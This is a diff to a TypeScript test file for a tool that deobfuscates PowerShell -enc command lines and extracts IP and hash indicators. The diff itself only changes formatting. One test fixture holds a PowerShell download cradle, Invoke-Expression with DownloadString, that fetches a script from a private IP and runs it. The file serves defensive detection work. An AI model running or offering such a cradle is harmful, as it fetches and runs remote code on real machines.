@@ -81,7 +81,8 @@ describe("deobfuscateText — PowerShell -enc (UTF-16LE)", () => {
   });
 
   it("decodes a -enc payload with an embedded IP IOC", () => {
-    const payload = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.55.100/run.ps1')";
+    const payload =
+      "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.55.100/run.ps1')";
     const r = deobfuscateText(psEncCmdline(payload));
     expect(r).not.toBeNull();
     expect(r!.rawIocs.some((i) => i.type === "ip" && i.value === "192.168.55.100")).toBe(true);
@@ -188,7 +189,12 @@ describe("applyDeobfuscation", () => {
     const hash = "b".repeat(64);
     const payload = `$checksum="${hash}"; Verify-FileHash`;
     const event = makeEvent(psEncCmdline(payload));
-    const existingIoc = { id: "i001", type: "hash" as const, value: "b".repeat(64), firstSeen: "2026-01-01T00:00:00Z" };
+    const existingIoc = {
+      id: "i001",
+      type: "hash" as const,
+      value: "b".repeat(64),
+      firstSeen: "2026-01-01T00:00:00Z",
+    };
     const state: InvestigationState = { ...makeState([event]), iocs: [existingIoc] };
     const { newIocs, state: next } = applyDeobfuscation(state);
     expect(newIocs).toBe(0);
